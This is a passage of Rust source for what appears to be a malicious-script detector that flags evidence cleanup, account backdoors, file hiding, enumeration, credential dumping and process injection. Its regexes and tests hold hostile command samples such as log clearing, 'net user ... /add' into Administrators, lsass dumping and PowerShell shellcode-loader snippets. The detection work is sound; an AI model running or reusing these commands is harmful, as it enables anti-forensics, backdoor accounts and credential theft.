        Regex::new(r#"(?im)^[^\r\n]*?\bdel(?:\.exe)?\b[^\r\n]*"#).expect("del line regex")
    });
    static REG_DELETE_HISTORY_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?im)^[^\r\n]*?\breg(?:\.exe)?\s+delete\b[^\r\n]*(?:\\UserAssist\b|\\RecentDocs\b|\\MuiCache\b|\\BagMRU\b|\\Shell\\Bags\b|\\ComDlg32\\(?:OpenSavePidlMRU|LastVisitedPidlMRU|LastVisitedPidlMRULegacy|OpenSaveMRU)\b|\\RunMRU\b|\\TypedPaths\b)[^\r\n]*"#)
            .expect("registry history delete regex")
    });

    fn clean_token(token: &str) -> String {
        token
            .trim()
            .trim_matches('"')
            .trim_matches('\'')
            .to_string()
    }

    let mut push = |action: &str, target: String, command: String| {
        if target.is_empty() {
            return;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t,
                crate::traits::Trait::EvidenceCleanup {
                    action: existing_action,
                    target: existing_target,
                    ..
                } if existing_action == action && existing_target == &target
            )
        }) {
            return;
        }
        env.traits.push(crate::traits::Trait::EvidenceCleanup {
            action: action.to_string(),
            target,
            command,
        });
    };

    for caps in EVENT_LOG_RE.captures_iter(deobfuscated) {
        let target = caps
            .get(1)
            .map(|m| clean_token(m.as_str()))
            .unwrap_or_default();
        let command = caps
            .get(0)
            .map(|m| m.as_str().trim().to_string())
            .unwrap_or_default();
        push("event-log-clear", target, command);
    }

    for caps in USN_RE.captures_iter(deobfuscated) {
        let command = caps
            .get(0)
            .map(|m| m.as_str().trim().to_string())
            .unwrap_or_default();
        push("usn-journal-delete", command.clone(), command);
    }

    for caps in DEL_LINE_RE.captures_iter(deobfuscated) {
        let Some(m) = caps.get(0) else {
            continue;
        };
        let command = m.as_str().trim();
        let lower = command.to_ascii_lowercase();
        if lower.contains("\\prefetch\\") || lower.contains("/prefetch/") {
            push(
                "prefetch-delete",
                "Prefetch".to_string(),
                command.to_string(),
            );
        }
        if lower.contains("\\recent\\")
            || lower.contains("/recent/")
            || lower.contains("automaticdestinations")
            || lower.contains("customdestinations")
        {
            push(
                "recent-items-delete",
                "Recent".to_string(),
                command.to_string(),
            );
        }
    }

    for caps in REG_DELETE_HISTORY_RE.captures_iter(deobfuscated) {
        let command = caps
            .get(0)
            .map(|m| m.as_str().trim().to_string())
            .unwrap_or_default();
        let lower = command.to_ascii_lowercase();
        let target = [
            "userassist",
            "recentdocs",
            "muicache",
            "bagmru",
            "shell\\bags",
            "comdlg32",
            "runmru",
            "typedpaths",
        ]
        .into_iter()
        .find(|needle| lower.contains(needle))
        .unwrap_or("registry-history")
        .to_string();
        push("registry-history-delete", target, command);
    }
}

fn has_evidence_cleanup_atom(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    [
        "wevtutil",
        "fsutil",
        "prefetch",
        "recent",
        "automaticdestinations",
        "customdestinations",
        "userassist",
        "recentdocs",
        "muicache",
        "bagmru",
        "shell\\bags",
        "comdlg32",
        "runmru",
        "typedpaths",
    ]
    .iter()
    .any(|atom| lower.contains(atom))
}

#[cfg(test)]
mod evidence_cleanup_prefilter_tests {
    use super::has_evidence_cleanup_atom;

    #[test]
    fn prefilter_allows_known_cleanup_targets() {
        for sample in [
            "wevtutil cl Security",
            "fsutil usn deletejournal /d c:",
            r#"del /s /q C:\Windows\Prefetch\*.*"#,
            r#"del /q "%APPDATA%\Microsoft\Windows\Recent\AutomaticDestinations\*.*""#,
            r#"del /q "%APPDATA%\Microsoft\Windows\Recent\CustomDestinations\*.*""#,
            r#"reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"#,
            r#"reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs"#,
            r#"reg delete HKCU\Software\Microsoft\Windows\ShellNoRoam\MUICache"#,
            r#"reg delete HKCU\Software\Microsoft\Windows\Shell\BagMRU"#,
            r#"reg delete HKCU\Software\Microsoft\Windows\Shell\Bags"#,
            r#"reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU"#,
            r#"reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"#,
            r#"reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths"#,
        ] {
            assert!(has_evidence_cleanup_atom(sample), "blocked: {sample}");
        }
    }

    #[test]
    fn prefilter_blocks_generic_delete_text() {
        assert!(!has_evidence_cleanup_atom(
            r#"del /f /q C:\Temp\installer.log"#
        ));
        assert!(!has_evidence_cleanup_atom(
            r#"reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v App /f"#,
        ));
    }
}

/// Network/IP discovery probes: nslookup, Resolve-DnsName, ping to
/// non-loopback IPs, calls to ipify/checkip/ip-api/geolocation APIs.
fn scan_network_probe(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    static RESOLVE_DNS_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?i)\bResolve-DnsName\s+(?:-Name\s+)?(?:"([^"]+)"|'([^']+)'|([A-Za-z0-9.\-]+))"#,
        )
        .expect("resolve-dns re")
    });
    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(command) = tokens.first() else {
            continue;
        };
        match command_basename(command).as_str() {
            "nslookup" | "nslookup.exe" => {
                if let Some(target) = tokens.iter().skip(1).find(|token| {
                    let token = token.trim_matches(['"', '\'']);
                    !token.starts_with('-') && !token.starts_with('/') && !token.is_empty()
                }) {
                    push_network_probe(
                        env,
                        "dns-lookup",
                        target.trim_matches(['"', '\'']).to_string(),
                    );
                }
            }
            "ping" | "ping.exe" => {
                if let Some(target) = network_probe_command_target(&tokens, "ping") {
                    push_network_probe(env, "icmp-ping", target);
                }
            }
            "tracert" | "tracert.exe" => {
                if let Some(target) = network_probe_command_target(&tokens, "tracert") {
                    push_network_probe(env, "route-trace", target);
                }
            }
            "pathping" | "pathping.exe" => {
                if let Some(target) = network_probe_command_target(&tokens, "pathping") {
                    push_network_probe(env, "route-trace", target);
                }
            }
            _ => {}
        }
    }
    for c in RESOLVE_DNS_RE.captures_iter(deobfuscated) {
        let h = c
            .get(1)
            .or_else(|| c.get(2))
            .or_else(|| c.get(3))
            .map(|m| m.as_str().to_string())
            .unwrap_or_default();
        push_network_probe(env, "dns-lookup", h);
    }
    let lower = deobfuscated.to_ascii_lowercase();
    for host in IP_DISCOVERY_HOSTS {
        if lower.contains(host) {
            push_network_probe(env, "ip-discovery", (*host).to_string());
        }
    }
}

fn network_probe_command_target(tokens: &[String], command: &str) -> Option<String> {
    let mut skip_next = false;
    for token in tokens.iter().skip(1) {
        let token = token.trim_matches(['"', '\'']);
        if skip_next {
            skip_next = false;
            continue;
        }
        if token.is_empty() {
            continue;
        }
        let lower = token.to_ascii_lowercase();
        if network_probe_option_takes_value(command, &lower) {
            skip_next = true;
            continue;
        }
        if lower.starts_with('-') || lower.starts_with('/') {
            continue;
        }
        let target = token.trim_end_matches(['.', ',', ';']).to_string();
        if is_loopback_ping_target(&target) {
            return None;
        }
        return Some(target);
    }
    None
}

fn network_probe_option_takes_value(command: &str, option: &str) -> bool {
    match command {
        "ping" => matches!(
            option,
            "-n" | "/n"
                | "-l"
                | "/l"
                | "-i"
                | "/i"
                | "-v"
                | "/v"
                | "-r"
                | "/r"
                | "-s"
                | "/s"
                | "-j"
                | "/j"
                | "-k"
                | "/k"
                | "-w"
                | "/w"
                | "-c"
                | "/c"
        ),
        "tracert" => matches!(
            option,
            "-h" | "/h" | "-j" | "/j" | "-w" | "/w" | "-s" | "/s"
        ),
        "pathping" => matches!(
            option,
            "-h" | "/h" | "-g" | "/g" | "-p" | "/p" | "-q" | "/q" | "-w" | "/w"
        ),
        _ => false,
    }
}

fn is_loopback_ping_target(target: &str) -> bool {
    let lower = target.trim_matches(['[', ']']).to_ascii_lowercase();
    if matches!(lower.as_str(), "localhost" | "::1") {
        return true;
    }
    lower
        .parse::<std::net::IpAddr>()
        .map(|addr| addr.is_loopback())
        .unwrap_or(false)
}

pub(crate) fn scan_network_probe_url(url: &str, env: &mut Environment) {
    let Some(host) = url_host_lower(url) else {
        return;
    };
    if IP_DISCOVERY_HOSTS.iter().any(|known| host == *known) {
        push_network_probe(env, "ip-discovery", host);
    }
}

fn url_host_lower(url: &str) -> Option<String> {
    let (_, rest) = url.split_once(':')?;
    let rest = rest.trim_start_matches(['/', '\\']);
    if rest.is_empty() {
        return None;
    }
    let authority = rest
        .split(['/', '\\', '?', '#'])
        .next()
        .unwrap_or_default()
        .rsplit('@')
        .next()
        .unwrap_or_default();
    let host = authority
        .strip_prefix('[')
        .and_then(|s| s.split_once(']').map(|(host, _)| host))
        .unwrap_or_else(|| authority.split(':').next().unwrap_or_default())
        .trim_end_matches('.');
    if host.is_empty() {
        None
    } else {
        Some(host.to_ascii_lowercase())
    }
}

fn push_network_probe(env: &mut Environment, kind: &str, target: String) {
    if target.is_empty() {
        return;
    }
    if env.traits.iter().any(|t| {
        matches!(
            t, crate::traits::Trait::NetworkProbe { probe_kind, target: tg }
                if probe_kind == kind && tg == &target
        )
    }) {
        return;
    }
    env.traits.push(crate::traits::Trait::NetworkProbe {
        probe_kind: kind.to_string(),
        target,
    });
}

/// Local account backdoor setup: create a local user or add an account
/// to a local group such as Administrators / Remote Desktop Users.
fn scan_account_modification(deobfuscated: &str, env: &mut Environment) {
    if !has_account_modification_atom(deobfuscated) {
        return;
    }

    use once_cell::sync::Lazy;
    use regex::Regex;
    static NET_USER_ADD_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?im)^[^\r\n]*?\bnet1?(?:\.exe)?\s+user\s+("[^"\r\n]+"|'[^'\r\n]+'|[^\s/]+)[^\r\n]*\s/add\b[^\r\n]*"#,
        )
        .expect("net user add regex")
    });
    static NET_LOCALGROUP_ADD_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?im)^[^\r\n]*?\bnet1?(?:\.exe)?\s+localgroup\s+("[^"\r\n]+"|'[^'\r\n]+'|[^\s/]+)\s+("[^"\r\n]+"|'[^'\r\n]+'|[^\s/]+)[^\r\n]*\s/add\b[^\r\n]*"#,
        )
        .expect("net localgroup add regex")
    });
    fn clean_token(token: &str) -> String {
        token
            .trim()
            .trim_matches('"')
            .trim_matches('\'')
            .to_string()
    }
    let mut push = |action: &str, account: String, group: Option<String>, command: String| {
        if account.is_empty() {
            return;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t,
                crate::traits::Trait::AccountModification {
                    action: existing_action,
                    account: existing_account,
                    group: existing_group,
                    ..
                } if existing_action == action
                    && existing_account == &account
                    && existing_group == &group
            )
        }) {
            return;
        }
        env.traits.push(crate::traits::Trait::AccountModification {
            action: action.to_string(),
            account,
            group,
            command,
        });
    };
    for caps in NET_USER_ADD_RE.captures_iter(deobfuscated) {
        let account = caps
            .get(1)
            .map(|m| clean_token(m.as_str()))
            .unwrap_or_default();
        let command = caps
            .get(0)
            .map(|m| m.as_str().trim().to_string())
            .unwrap_or_default();
        push("local-user-add", account, None, command);
    }
    for caps in NET_LOCALGROUP_ADD_RE.captures_iter(deobfuscated) {
        let group = caps
            .get(1)
            .map(|m| clean_token(m.as_str()))
            .unwrap_or_default();
        let account = caps
            .get(2)
            .map(|m| clean_token(m.as_str()))
            .unwrap_or_default();
        let command = caps
            .get(0)
            .map(|m| m.as_str().trim().to_string())
            .unwrap_or_default();
        push("localgroup-add", account, Some(group), command);
    }
}

fn has_account_modification_atom(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    lower.contains("/add")
        && lower.contains("net")
        && (lower.contains("user") || lower.contains("localgroup"))
}

#[cfg(test)]
mod account_modification_prefilter_tests {
    use super::has_account_modification_atom;

    #[test]
    fn prefilter_allows_net_user_and_localgroup_adds() {
        for sample in [
            r#"net user support P@ssw0rd /add"#,
            r#"net1.exe user support P@ssw0rd /ADD"#,
            r#"net localgroup Administrators support /add"#,
        ] {
            assert!(has_account_modification_atom(sample), "blocked: {sample}");
        }
    }

    #[test]
    fn prefilter_blocks_unrelated_net_usage() {
        assert!(!has_account_modification_atom(r#"net user"#));
        assert!(!has_account_modification_atom(r#"echo /add"#));
    }
}

/// File/directory concealment via `attrib +h` / `attrib +s`. Common
/// malware batches hide staged scripts and binaries after writing them
/// into AppData, Templates, or Startup directories.
fn scan_file_concealment(deobfuscated: &str, env: &mut Environment) {
    if !has_file_concealment_atom(deobfuscated) {
        return;
    }

    fn clean_token(token: &str) -> String {
        token
            .trim()
            .trim_matches('"')
            .trim_matches('\'')
            .to_string()
    }

    fn attribute_name(token: &str) -> Option<&'static str> {
        match token.trim().to_ascii_lowercase().as_str() {
            "+h" => Some("hidden"),
            "+s" => Some("system"),
            "+r" => Some("readonly"),
            "+a" => Some("archive"),
            _ => None,
        }
    }

    fn is_attrib_option(token: &str) -> bool {
        matches!(
            token.trim().to_ascii_lowercase().as_str(),
            "/s" | "/d" | "/l"
        )
    }

    fn is_redirection_or_control(token: &str) -> bool {
        let trimmed = token.trim();
        trimmed.starts_with('>')
            || trimmed.starts_with('<')
            || trimmed.starts_with("2>")
            || trimmed == "&"
            || trimmed == "&&"
            || trimmed == "|"
    }

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd_index) = tokens.iter().position(|token| {
            matches!(
                basename_lower(clean_token(token).as_str()).as_str(),
                "attrib" | "attrib.exe"
            )
        }) else {
            continue;
        };

        let mut attributes = Vec::new();
        let mut target = String::new();
        for token in tokens.iter().skip(cmd_index + 1) {
            if is_redirection_or_control(token) {
                break;
            }
            if let Some(attribute) = attribute_name(token) {
                if !attributes.iter().any(|existing| existing == attribute) {
                    attributes.push(attribute.to_string());
                }
                continue;
            }
            if token.starts_with('-') || token.starts_with('+') || is_attrib_option(token) {
                continue;
            }
            if target.is_empty() {
                target = clean_token(token);
            }
        }

        if target.is_empty()
            || !attributes
                .iter()
                .any(|attribute| attribute == "hidden" || attribute == "system")
        {
            continue;
        }

        if env.traits.iter().any(|t| {
            matches!(
                t,
                crate::traits::Trait::FileConcealment {
                    target: existing_target,
                    attributes: existing_attributes,
                    ..
                } if existing_target == &target && existing_attributes == &attributes
            )
        }) {
            continue;
        }

        env.traits.push(crate::traits::Trait::FileConcealment {
            target,
            attributes,
            command: line.trim().to_string(),
        });
    }
}

fn has_file_concealment_atom(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    lower.contains("attrib") && (lower.contains("+h") || lower.contains("+s"))
}

#[cfg(test)]
mod file_concealment_prefilter_tests {
    use super::has_file_concealment_atom;

    #[test]
    fn prefilter_allows_hidden_and_system_attrib_commands() {
        assert!(has_file_concealment_atom(r#"attrib +h payload.exe"#));
        assert!(has_file_concealment_atom(r#"ATTRIB +S "%APPDATA%\a.bat""#));
    }

    #[test]
    fn prefilter_blocks_attrib_without_concealment_flags() {
        assert!(!has_file_concealment_atom(r#"attrib -h payload.exe"#));
        assert!(!has_file_concealment_atom(r#"echo +h payload.exe"#));
    }
}

/// System enumeration / account discovery. `net user`, `net group`,
/// `net localgroup administrators`, `whoami /priv`, `Get-LocalUser`,
/// `Get-NetUser` (PowerView).
fn scan_enumeration(deobfuscated: &str, env: &mut Environment) {
    if !has_enumeration_atom(deobfuscated) {
        return;
    }

    use once_cell::sync::Lazy;
    use regex::Regex;
    static PATTERNS: Lazy<Vec<(Regex, &str, bool)>> = Lazy::new(|| {
        vec![
            (
                Regex::new(r"(?im)^[^\r\n]*?\bnet(?:\.exe)?\s+(?:user|group|localgroup)\b[^\r\n]*")
                    .unwrap(),
                "net-user",
                false,
            ),
            (
                Regex::new(r"(?im)^[^\r\n]*?\bnet1?(?:\.exe)?\s+view\b[^\r\n]*").unwrap(),
                "net-view",
                false,
            ),
            (
                Regex::new(r"(?i)\bwhoami(?:\.exe)?\s+/(?:priv|groups|all)\b").unwrap(),
                "whoami-priv",
                false,
            ),
            (
                Regex::new(r"(?i)\b(?:query\s+session|quser)\b").unwrap(),
                "query-session",
                false,
            ),
            (
                Regex::new(r"(?i)\bGet-LocalUser\b").unwrap(),
                "get-localuser",
                false,
            ),
            (
                Regex::new(r"(?i)\bGet-NetUser\b|\bGet-NetGroup\b").unwrap(),
                "powerview-get",
                false,
            ),
            (
                Regex::new(r"(?i)\bsysteminfo(?:\.exe)?\b").unwrap(),
                "systeminfo",
                false,
            ),
            (
                Regex::new(r"(?i)\b(?:tasklist|wmic\s+process)\b").unwrap(),
                "tasklist",
                false,
            ),
            (
                Regex::new(
                    r"(?im)\bwmic(?:\.exe)?\s+(?:cpu|computersystem|logicaldisk|partition|path\s+softwareLicensingService)\b[^\r\n]*?\bget\b[^\r\n]*",
                )
                .unwrap(),
                "wmic-enum",
                true,
            ),
        ]
    });
    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(command) = tokens.first() else {
            continue;
        };
        let Some(kind) = network_utility_enumeration_kind(&tokens, command) else {
            continue;
        };
        push_enumeration_once(env, kind, line.trim().to_string(), true);
    }
    for (re, kind, multi) in PATTERNS.iter() {
        let matches: Box<dyn Iterator<Item = regex::Match<'_>> + '_> = if *multi {
            Box::new(re.find_iter(deobfuscated))
        } else {
            Box::new(re.find(deobfuscated).into_iter())
        };
        for m in matches {
            let cmd = m
                .as_str()
                .chars()
                .take(120)
                .collect::<String>()
                .trim()
                .to_string();
            let cmd = if *kind == "wmic-enum" {
                sanitize_wmic_enum_command(&cmd)
            } else {
                cmd
            };
            push_enumeration_once(env, kind, cmd, *multi);
        }
    }
}

fn network_utility_enumeration_kind(tokens: &[String], command: &str) -> Option<&'static str> {
    match command_basename(command).as_str() {
        "ipconfig" | "ipconfig.exe" => Some("ipconfig"),
        "getmac" | "getmac.exe" => Some("getmac"),
        "netstat" | "netstat.exe" => Some("netstat"),
        "arp" | "arp.exe" => tokens
            .iter()
            .skip(1)
            .any(|token| matches!(token.to_ascii_lowercase().as_str(), "-a" | "/a" | "a"))
            .then_some("arp"),
        "route" | "route.exe" => tokens
            .get(1)
            .map(|token| token.eq_ignore_ascii_case("print"))
            .unwrap_or(false)
            .then_some("route"),
        _ => None,
    }
}

fn push_enumeration_once(
    env: &mut Environment,
    kind: &str,
    command: String,
    command_specific: bool,
) {
    if env.traits.iter().any(|t| {
        matches!(
            t,
            crate::traits::Trait::Enumeration { enum_kind: k, command: existing_command }
                if k == kind && (!command_specific || existing_command == &command)
        )
    }) {
        return;
    }
    env.traits.push(crate::traits::Trait::Enumeration {
        enum_kind: kind.to_string(),
        command,
    });
}

fn sanitize_wmic_enum_command(command: &str) -> String {
    let mut end = command.len();
    for marker in ["') do", "\") do", "` ) do", "`n", "\\n"] {
        if let Some(idx) = command.find(marker) {
            end = end.min(idx);
        }
    }
    command[..end]
        .trim()
        .trim_end_matches(['\'', ')'])
        .trim()
        .to_string()
}

fn has_enumeration_atom(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    [
        "net",
        "whoami",
        "query session",
        "quser",
        "get-localuser",
        "get-netuser",
        "get-netgroup",
        "systeminfo",
        "tasklist",
        "ipconfig",
        "getmac",
        "netstat",
        "arp -a",
        "arp.exe -a",
        "arp /a",
        "arp.exe /a",
        "route print",
        "route.exe print",
        "wmic process",
        "wmic.exe process",
        "wmic cpu",
        "wmic.exe cpu",
        "wmic computersystem",
        "wmic.exe computersystem",
        "wmic logicaldisk",
        "wmic.exe logicaldisk",
        "wmic partition",
        "wmic.exe partition",
        "wmic path softwarelicensingservice",
        "wmic.exe path softwarelicensingservice",
    ]
    .iter()
    .any(|atom| lower.contains(atom))
}

#[cfg(test)]
mod enumeration_prefilter_tests {
    use super::has_enumeration_atom;

    #[test]
    fn prefilter_allows_known_enumeration_commands() {
        for sample in [
            "net user",
            "net view /domain",
            "whoami /priv",
            "query session",
            "quser",
            "Get-LocalUser",
            "Get-NetGroup",
            "systeminfo",
            "tasklist",
            "ipconfig /all",
            "getmac",
            "netstat -ano",
            "arp -a",
            "arp.exe /a",
            "route print",
            "route.exe print",
            "wmic process list",
            "wmic.exe process list",
            "wmic cpu get name",
            "wmic.exe cpu get name",
            "wmic logicaldisk get size",
            "wmic path softwareLicensingService get OA3xOriginalProductKey",
        ] {
            assert!(has_enumeration_atom(sample), "blocked: {sample}");
        }
    }

    #[test]
    fn prefilter_blocks_unrelated_commands() {
        assert!(!has_enumeration_atom("echo hello"));
    }
}

/// Credential access — lsass dumping, Mimikatz invocations, browser
/// credential paths (Login Data SQLite, NSS key3.db, etc.), well-known
/// credential-theft tooling.
fn scan_credential_access(deobfuscated: &str, env: &mut Environment) {
    if !has_credential_access_atom(deobfuscated) {
        return;
    }

    use once_cell::sync::Lazy;
    use regex::Regex;
    static PATTERNS: Lazy<Vec<(Regex, &str, fn(&str) -> String)>> = Lazy::new(|| {
        vec![
            // lsass dump via comsvcs.dll / procdump / rundll32 minidumpwritedump
            (Regex::new(r#"(?i)\b(?:rundll32(?:\.exe)?\s+\S*comsvcs\.dll[^\r\n]*?MiniDump|procdump(?:64)?(?:\.exe)?[^\r\n]*?lsass|sqldumper[^\r\n]*?lsass)"#).unwrap(),
             "lsass-dump", |m: &str| m.chars().take(120).collect()),
            // Mimikatz invocations
            (Regex::new(r#"(?i)\b(?:Invoke-Mimikatz|mimikatz(?:\.exe)?\b|sekurlsa::|kerberos::|crypto::|lsadump::)"#).unwrap(),
             "mimikatz", |m| m.to_string()),
            // Browser credential paths
            (Regex::new(r#"(?i)\\Google\\Chrome\\User Data\\\S*Login Data|\\Mozilla\\Firefox\\Profiles\\\S*\\(?:key[34]\.db|logins\.json|cookies\.sqlite)|\\BraveSoftware\\\S*Login Data"#).unwrap(),
             "browser-cred-path", |m| m.chars().take(120).collect()),
            // Nirsoft tooling
            (Regex::new(r#"(?i)\b(?:nirsoft|webbrowserpassview|mailpassview|chromepass)\b"#).unwrap(),
             "nirsoft", |m| m.to_string()),
            // Wdigest credentials
            (Regex::new(r#"(?i)\b(?:UseLogonCredential|WDigest)\b"#).unwrap(),
             "wdigest-creds", |m| m.to_string()),
        ]
    });
    for (re, tech, fmt) in PATTERNS.iter() {
        if let Some(m) = re.find(deobfuscated) {
            let target = fmt(m.as_str());
            if env.traits.iter().any(|t| {
                matches!(
                    t, crate::traits::Trait::CredentialAccess { technique: tk, .. } if tk == tech
                )
            }) {
                continue;
            }
            env.traits.push(crate::traits::Trait::CredentialAccess {
                technique: tech.to_string(),
                target,
            });
        }
    }
}

fn has_credential_access_atom(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    [
        "comsvcs.dll",
        "minidump",
        "procdump",
        "sqldumper",
        "lsass",
        "invoke-mimikatz",
        "mimikatz",
        "sekurlsa::",
        "kerberos::",
        "crypto::",
        "lsadump::",
        "\\google\\chrome\\user data\\",
        "login data",
        "\\mozilla\\firefox\\profiles\\",
        "key3.db",
        "key4.db",
        "logins.json",
        "cookies.sqlite",
        "\\bravesoftware\\",
        "nirsoft",
        "webbrowserpassview",
        "mailpassview",
        "chromepass",
        "uselogoncredential",
        "wdigest",
    ]
    .iter()
    .any(|atom| lower.contains(atom))
}

#[cfg(test)]
mod credential_access_prefilter_tests {
    use super::has_credential_access_atom;

    #[test]
    fn prefilter_allows_known_credential_access_markers() {
        for sample in [
            "rundll32 comsvcs.dll MiniDump",
            "procdump.exe -ma lsass.exe",
            "Invoke-Mimikatz",
            r#"\Google\Chrome\User Data\Default\Login Data"#,
            "webbrowserpassview",
            "UseLogonCredential",
        ] {
            assert!(has_credential_access_atom(sample), "blocked: {sample}");
        }
    }

    #[test]
    fn prefilter_blocks_unrelated_powershell_text() {
        assert!(!has_credential_access_atom(
            "Start-Process powershell.exe -WindowStyle Hidden"
        ));
    }
}

/// Process injection — Win32 API names invoked from PS via Add-Type
/// / P/Invoke, or via .NET Reflection. MITRE T1055.
fn scan_process_injection(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    if !has_process_injection_atom(deobfuscated) {
        return;
    }

    static API_RE: Lazy<Regex> = Lazy::new(|| {
        // `CreateThread` (no `Ex` suffix) is the local-process variant
        // meter.ps1 uses — same shellcode-execution intent. `VirtualProtect`
        // is the classic AMSI-bypass primitive (flip the AmsiScanBuffer
        // page to RWX before patching). Both are real ProcessInjection
        // signals in the corpus we sweep, so include them.
        // `GetProcAddress`/`GetModuleHandle`/`LoadLibrary` aren't injection
        // by themselves but the Cobalt-Strike / Meterpreter PowerShell
        // loader family (40010.ps1, index.ps1, sd4.ps1) ALWAYS resolves
        // them via reflection — and that resolution is the canonical
        // marker of an in-memory shellcode loader. Flag them as
        // ProcessInjection so the high-signal IOC surfaces.
        Regex::new(r#"(?i)\b(VirtualAllocEx|VirtualAlloc|VirtualProtect(?:Ex)?|WriteProcessMemory|CreateRemoteThread(?:Ex)?|CreateThread|NtMapViewOfSection|NtCreateThreadEx|NtAllocateVirtualMemory|NtWriteVirtualMemory|QueueUserAPC|SetWindowsHookEx|RtlMoveMemory|ZwAllocateVirtualMemory|GetDelegateForFunctionPointer|GetProcAddress|GetModuleHandle|LoadLibraryA?|UnsafeNativeMethods)\b"#)
            .expect("inject api re")
    });
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    for m in API_RE.find_iter(deobfuscated) {
        let api = m.as_str().to_string();
        if !seen.insert(api.clone()) {
            continue;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t, crate::traits::Trait::ProcessInjection { api: a } if a == &api
            )
        }) {
            continue;
        }
        env.traits
            .push(crate::traits::Trait::ProcessInjection { api });
    }
}

fn has_process_injection_atom(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    [
        "virtualalloc",
        "virtualprotect",
        "writeprocessmemory",
        "createremotethread",
        "createthread",
        "ntmapviewofsection",
        "ntcreatethreadex",
        "ntallocatevirtualmemory",
        "ntwritevirtualmemory",
        "queueuserapc",
        "setwindowshookex",
        "rtlmovememory",
        "zwallocatevirtualmemory",
        "getdelegateforfunctionpointer",
        "getprocaddress",
        "getmodulehandle",
        "loadlibrary",
        "unsafenativemethods",
    ]
    .iter()
    .any(|atom| lower.contains(atom))
}

#[cfg(test)]
mod process_injection_prefilter_tests {
    use super::{has_process_injection_atom, scan_process_injection};
    use crate::env::{Config, Environment};
    use crate::traits::Trait;

    #[test]
    fn prefilter_allows_known_process_injection_apis() {
        for sample in [
            "VirtualAllocEx",
            "VirtualProtect",
            "WriteProcessMemory",
            "CreateRemoteThreadEx",
            "CreateThread",
            "NtMapViewOfSection",
            "NtCreateThreadEx",
            "NtAllocateVirtualMemory",
            "NtWriteVirtualMemory",
            "QueueUserAPC",
            "SetWindowsHookEx",
            "RtlMoveMemory",
            "ZwAllocateVirtualMemory",
            "Marshal.GetDelegateForFunctionPointer",
            "GetProcAddress",
            "GetModuleHandle",
            "LoadLibraryA",
            "UnsafeNativeMethods",
        ] {
            assert!(has_process_injection_atom(sample), "blocked: {sample}");
        }
    }

    #[test]
    fn prefilter_blocks_unrelated_powershell_text() {
        assert!(!has_process_injection_atom(
            "Start-Process powershell.exe -WindowStyle Hidden"
        ));
        assert!(!has_process_injection_atom(
            "Get-Process | Select-Object ProcessName"
        ));
    }

    #[test]
    fn scanner_flags_nt_allocate_virtual_memory_delegate_loader() {
        let script = r#"
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Loader {
  [DllImport("ntdll.dll")]
  private static extern int NtAllocateVirtualMemory(IntPtr process, ref IntPtr baseAddress, IntPtr zeroBits, ref ulong regionSize, uint allocationType, uint protect);
  public static void Run(byte[] shellcode) {
    IntPtr addr = IntPtr.Zero;
    ulong size = (ulong)shellcode.Length;
    NtAllocateVirtualMemory((IntPtr)(-1), ref addr, IntPtr.Zero, ref size, 0x3000, 0x40);
    Marshal.Copy(shellcode, 0, addr, shellcode.Length);
    ((Action)Marshal.GetDelegateForFunctionPointer(addr, typeof(Action)))();
  }
}
"@
"#;
        let mut env = Environment::new(&Config::default());
        scan_process_injection(script, &mut env);

        for expected in ["NtAllocateVirtualMemory", "GetDelegateForFunctionPointer"] {
            assert!(
                env.traits.iter().any(|t| matches!(
                    t,
                    Trait::ProcessInjection { api } if api == expected
                )),
                "missing process injection marker {expected}: {:?}",
                env.traits
            );
        }
    }

    #[test]
    fn scanner_flags_nt_write_virtual_memory_loader() {
        let script = r#"
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Loader {
  [DllImport("ntdll.dll")]
  private static extern int NtWriteVirtualMemory(IntPtr process, IntPtr baseAddress, byte[] buffer, uint size, ref uint written);
  public static void Run(IntPtr process, IntPtr address, byte[] shellcode) {
    uint written = 0;
    NtWriteVirtualMemory(process, address, shellcode, (uint)shellcode.Length, ref written);
  }
}
"@
"#;
        let mut env = Environment::new(&Config::default());
        scan_process_injection(script, &mut env);

        assert!(
            env.traits.iter().any(|t| matches!(
                t,
                Trait::ProcessInjection { api } if api == "NtWriteVirtualMemory"
            )),
            "missing process injection marker NtWriteVirtualMemory: {:?}",
            env.traits
        );
    }
}

/// Input capture — keylogging, clipboard, screenshot. MITRE T1056.
fn scan_input_capture(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    static PATTERNS: Lazy<Vec<(Regex, &str)>> = Lazy::new(|| {
        vec![
            (
                Regex::new(
                    r#"(?i)\b(?:GetAsyncKeyState|SetWindowsHookEx(?:A|W)?|GetKeyboardState)\b"#,
                )
                .unwrap(),
                "keylog",
            ),
            (
                Regex::new(
                    r#"(?i)\b(?:Get-Clipboard|Set-Clipboard|GetClipboardData|OpenClipboard)\b"#,
                )
                .unwrap(),
                "clipboard",
            ),
            (
                Regex::new(
